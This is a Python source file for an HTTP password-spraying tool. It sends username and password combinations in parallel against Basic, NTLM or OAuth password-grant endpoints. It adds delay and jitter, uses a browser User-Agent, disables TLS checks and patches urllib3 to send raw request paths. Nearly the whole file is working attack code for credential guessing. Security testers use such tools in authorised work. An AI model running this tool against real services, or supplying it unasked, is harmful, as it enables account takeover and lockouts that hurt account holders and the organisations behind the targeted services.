from argparse import ArgumentParser, Namespace
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Generator
import concurrent.futures
import json
import random
import sys
import time
import urllib.parse

from requests import Response, Session
from requests.auth import HTTPBasicAuth
from requests_ntlm import HttpNtlmAuth
import urllib3
import urllib3.connection
import urllib3.util

session = Session()
session.verify = False

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def basic_auth(opts: Namespace, username: str, password: str) -> Response:
    return session.post(opts.target, auth=HTTPBasicAuth(username, password))


def ntlm_auth(opts: Namespace, username: str, password: str) -> Response:
    return session.post(opts.target, auth=HttpNtlmAuth(username, password))


def oauth_password_grant(opts: Namespace, username: str, password: str) -> Response:
    return session.post(opts.target, data=dict(client_id=opts.client_id, scope=opts.scope, username=username, password=password, grant_type='password', resource=opts.resource))


AUTHENTICATION_METHODS = dict(basic=basic_auth, ntlm=ntlm_auth, oauth=oauth_password_grant)


def uint(value: str) -> int:
    result = int(value)
    if result < 0:
        raise ValueError('invalid unsigned integer')
    return result


def main() -> None:
    entrypoint = ArgumentParser()
    entrypoint.add_argument('-t', '--target', type=urllib.parse.urlparse, metavar='URL')
    entrypoint.add_argument('-m', '--method', choices=tuple(AUTHENTICATION_METHODS), required=True, metavar='|'.join(AUTHENTICATION_METHODS))
    entrypoint.add_argument('--threads', type=uint, default=1, metavar='UINT')
    entrypoint.add_argument('--user-agent', default='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6356.209 Safari/537.36', metavar='STRING')
    entrypoint.add_argument('--delay', type=uint, default=0, metavar='SECONDS')
    entrypoint.add_argument('--jitter', type=uint, default=0, metavar='SECONDS')
    group = entrypoint.add_argument_group('auth')
    group.add_argument('-u', '--user', action='append', default=[], metavar='STRING')
    group.add_argument('-U', '--users', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-p', '--password', action='append', default=[], metavar='STRING')
    group.add_argument('-P', '--passwords', action='append', type=Path, default=[], metavar='FILE')
    group.add_argument('-c', '--credential', action='append', default=[], metavar='USER:PASS')
    group.add_argument('-C', '--credentials', action='append', type=Path, default=[], metavar='FILE')
    group = entrypoint.add_argument_group('oauth')
    group.add_argument('--client-id', default=None, metavar='UUID')
    group.add_argument('--scope', default='openid profile offline_access', metavar='STRING')
    group.add_argument('--resource', default=None, metavar='STRING')

    opts = entrypoint.parse_args()
    #print(opts.target)

    if not (((opts.user or opts.users) and (opts.password or opts.passwords)) or opts.credential or opts.credentials):
        print('error: users, passwords or credentials missing')
        print()
        entrypoint.print_help()
        exit(1)

    if opts.method == 'oauth' and not (opts.client_id and opts.scope and opts.resource):
        print('error: oauth requires --client-id and --resource')
        print()
        entrypoint.print_help()
        exit(1)

    session.headers['User-Agent'] = opts.user_agent
    # set raw url path as internal header, also see 'make_request' below
    session.headers['X-HTTPSpray-Path'] = opts.target.path
    opts.target = urllib.parse.urlunparse(opts.target)

    error = check(opts)
    if error:
        log(**error)
        exit(1)
    for result in spray(opts):
        log(**result)


def check(opts: Namespace) -> dict[str, Any]|None:
    if opts.method not in ('basic', 'ntlm'):
        return None
    response = session.get(opts.target)
    if opts.method not in response.headers.get('WWW-Authenticate', '').lower():
        return dict(error=f'{opts.method} authentication not supported', status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds(), headers=dict(response.headers))
    return None


def spray(opts: Namespace) -> Generator[dict[str, Any], None, None]:
    with ThreadPoolExecutor(max_workers=opts.threads) as pool:
        futures = []
        for username in generate(opts.user, opts.users):
            for password in generate(opts.password, opts.passwords):
                future = pool.submit(authenticate, opts, (username, password))
                futures.append(future)
        for credential in generate(opts.credential, opts.credentials):
            username, password = credential.split(':', maxsplit=1)
            future = pool.submit(authenticate, opts, (username, password))
            futures.append(future)
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            yield result


def generate(entries: list[str], paths: list[Path]) -> Generator[str, None, None]:
    for entry in entries:
        yield entry
    for path in paths:
        with open(path, 'r') as file:
            for line in file:
                yield line.rstrip('\n')


def authenticate(opts: Namespace, credential: tuple[str, str]) -> dict[str, Any]:
    auth = AUTHENTICATION_METHODS[opts.method]
    username, password = credential
    response = auth(opts, username, password)
    time.sleep(random.randint(opts.delay - opts.jitter, opts.delay + opts.jitter))
    return dict(username=username, password=password, status_code=response.status_code, size=len(response.content), time=response.elapsed.total_seconds())


def log(**kwargs: Any) -> None:
    json.dump(kwargs, sys.stdout, separators=(',', ':'))


# undo path normalization applied by requests and urllib3
# overwriting the 'url' attribute of a prepared request was not enough
# see https://github.com/psf/requests/issues/6115#issuecomment-1913102974

def make_request(self: urllib3.connectionpool.HTTPConnectionPool, conn: urllib3.connection.HTTPConnection|urllib3.connection.HTTPSConnection, method: str, url: str, body: Any, headers: dict[str, str], **kwargs: Any):
    # headers is a reference to the global 'session.headers'
    headers = headers.copy()
    # overwrite request path with original path from internal header
    url = headers.pop('X-HTTPSpray-Path')
    function = getattr(self, '_original_make_request')
    return function(conn, method, url, body, headers, **kwargs)

setattr(urllib3.connectionpool.HTTPConnectionPool, '_original_make_request', urllib3.connectionpool.HTTPConnectionPool._make_request)
setattr(urllib3.connectionpool.HTTPConnectionPool, '_make_request', make_request)


if __name__ == '__main__':
    main()
